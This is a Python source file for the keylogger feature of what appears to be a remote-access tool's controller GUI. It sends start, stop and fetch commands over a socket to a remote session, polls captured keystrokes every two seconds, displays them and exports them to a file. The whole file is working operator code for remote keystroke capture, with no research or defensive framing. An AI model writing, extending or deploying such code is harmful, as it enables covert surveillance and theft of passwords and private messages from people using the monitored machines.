# -*- coding: utf-8 -*-
"""
features/keylogger.py - Mixin Keystroke Logger.
"""
import struct
import threading
import tkinter as tk
import customtkinter as ctk
from tkinter import messagebox, filedialog


class KeyloggerMixin:

    def open_keylogger_window(self):
        self.disable_main_buttons()
        self.keylog_window = ctk.CTkToplevel(self.main_window)
        self.keylog_window.title(
            f"Keystroke Logger - {self.session_name}{self.connection_info}"
        )
        self.keylog_window.geometry("750x600")
        self.keylog_window.protocol("WM_DELETE_WINDOW", self.on_close_keylogger_window)
        self.bring_to_front(self.keylog_window)

        self.is_auto_fetching_keylog = False

        tool_frame = ctk.CTkFrame(self.keylog_window, corner_radius=10, fg_color=self.bg_card)
        tool_frame.pack(fill=ctk.X, pady=20, padx=20)

        self.toggle_keylog_btn = ctk.CTkButton(
            tool_frame, text="▶ Start Logging", command=self.toggle_keylogger,
            fg_color="transparent", border_width=1, text_color=self.accent_blue, width=120
        )
        self.toggle_keylog_btn.pack(side=tk.LEFT, padx=15, pady=15)

        self.keylog_status_lbl = ctk.CTkLabel(
            tool_frame, text="Status: Stopped",
            text_color=self.text_muted, font=("Arial", 13, "bold")
        )
        self.keylog_status_lbl.pack(side=tk.LEFT, padx=15)

        ctk.CTkButton(
            tool_frame, text="Close", command=self.on_close_keylogger_window,
            fg_color="transparent", hover_color=("#FDE7E9", "#4A1A1E"),
            text_color=self.accent_red, width=80
        ).pack(side=tk.RIGHT, padx=15)

        ctk.CTkButton(
            tool_frame, text="💾 Export Log", command=self.save_keylog_to_file,
            fg_color=self.accent_blue, width=120
        ).pack(side=tk.RIGHT, padx=5)

        ctk.CTkLabel(
            self.keylog_window,
            text=f"Captured Keystrokes from {self.session_name}:",
            font=("Arial", 14, "bold")
        ).pack(anchor="w", padx=25, pady=(0, 5))

        self.keylog_text = ctk.CTkTextbox(
            self.keylog_window, font=("Consolas", 13), corner_radius=10, fg_color=self.bg_card
        )
        self.keylog_text.pack(expand=True, fill=ctk.BOTH, padx=20, pady=(0, 20))

    def toggle_keylogger(self):
        if not self.is_auto_fetching_keylog:
            self.is_auto_fetching_keylog = True
            self.toggle_keylog_btn.configure(
                text="⏹ Stop Logging", text_color=self.accent_red, border_color=self.accent_red
            )
            self.keylog_status_lbl.configure(text="Status: Recording...", text_color=self.accent_green)
            self.update_keylog_text("\n\n--- LOGGING STARTED ---\n")
            with self.net_lock:
                try:
                    self.client_socket.sendall(b"START_KEYLOG")
                except:
                    pass
            self.keylog_window.after(1000, self.auto_fetch_loop)
        else:
            self.is_auto_fetching_keylog = False
            self.toggle_keylog_btn.configure(
                text="▶ Start Logging", text_color=self.accent_blue, border_color=self.accent_blue
            )
            self.keylog_status_lbl.configure(text="Status: Stopped", text_color=self.text_muted)
            self.update_keylog_text("\n\n--- LOGGING STOPPED ---\n")
            with self.net_lock:
                try:
                    self.client_socket.sendall(b"STOP_KEYLOG")
                except:
                    pass

    def auto_fetch_loop(self):
        if self.is_auto_fetching_keylog:
            threading.Thread(target=self.fetch_keylog_data, daemon=True).start()
            self.keylog_window.after(2000, self.auto_fetch_loop)

    def fetch_keylog_data(self):
        with self.net_lock:
            try:
                self.client_socket.sendall(b"GET_KEYLOG")
                raw_msglen = self.recvall(4)
                if not raw_msglen:
                    return
                msglen = struct.unpack('>I', raw_msglen)[0]
                log_data = self.recvall(msglen).decode('utf-8', errors='replace')
                if log_data and "No keystrokes" not in log_data:
                    self.main_window.after(0, lambda d=log_data: self.update_keylog_text(d))
            except:
                pass

    def update_keylog_text(self, text):
        self.keylog_text.configure(state=tk.NORMAL)
        self.keylog_text.insert(tk.END, text)
        self.keylog_text.yview(tk.END)
        self.keylog_text.configure(state=tk.DISABLED)

    def save_keylog_to_file(self):
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
            title="Export Keystroke Log",
        )
        if filepath:
            try:
                log_content = self.keylog_text.get("1.0", tk.END)
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(log_content)
                messagebox.showinfo(
                    "Export Successful", f"Log exported to:\n{filepath}", parent=self.keylog_window
                )
                return True
            except Exception as e:
                err_msg = str(e)
                messagebox.showerror(
                    "Export Error", f"Unable to save file: {err_msg}", parent=self.keylog_window
                )
        return False

    def on_close_keylogger_window(self):
        log_content = self.keylog_text.get("1.0", tk.END).strip()
        if log_content and "--- LOGGING STARTED ---" in log_content:
            ans = messagebox.askyesnocancel(
                "Unsaved Data",
                "Do you want to export the captured keystrokes before closing?",
                parent=self.keylog_window,
            )
            if ans is True:
                if not self.save_keylog_to_file():
                    return
            elif ans is None:
                return
        self.is_auto_fetching_keylog = False
        with self.net_lock:
            try:
                self.client_socket.sendall(b"STOP_KEYLOG")
            except:
                pass
        self.keylog_window.destroy()
        self.enable_main_buttons()
